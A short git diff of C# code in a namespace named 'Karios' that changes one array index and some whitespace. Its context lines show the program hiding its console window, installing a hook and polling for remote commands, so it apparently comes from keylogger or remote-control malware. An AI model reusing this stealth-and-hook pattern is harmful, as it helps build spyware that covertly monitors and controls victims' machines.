@@ -34,7 +34,8 @@ namespace Karios
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             _hookID = SetHook(_proc);
-            CommandGet();            
+            CommandGet();
+                        
         }
 
 
@@ -162,7 +163,7 @@ namespace Karios
                         }
 
 
-                        if (PreppedCommand[0] == "Online=True")
+                        if (PreppedCommand[1] == "Online=True")
                         {
                             // Runs application
                             
